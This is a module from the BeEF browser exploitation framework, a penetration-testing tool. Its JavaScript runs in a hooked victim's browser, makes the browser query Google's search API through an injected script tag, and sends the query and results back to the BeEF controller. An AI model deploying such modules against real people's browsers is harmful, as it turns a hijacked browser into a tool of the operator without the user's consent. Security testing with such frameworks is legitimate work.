//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var query = beef.encode.base64.decode('<%= Base64.encode64(@query).delete("\n") %>');

	var searchGoogle = function(query) {

		var script = document.createElement('script');
		script.defer = true;
		script.type = "text/javascript";
		script.src = "https://ajax.googleapis.com/ajax/services/search/web?callback=callback&lstkp=0&rsz=large&hl=en&q=" + query + "&v=1.0";

		callback = function (results) {
			document.body.removeChild(script);
			delete callback;
			beef.net.send('<%= @command_url %>', <%= @command_id %>, "query="+query+"&results="+JSON.stringify(results));
		};

		document.body.appendChild(script);
	}

	searchGoogle(query);

});

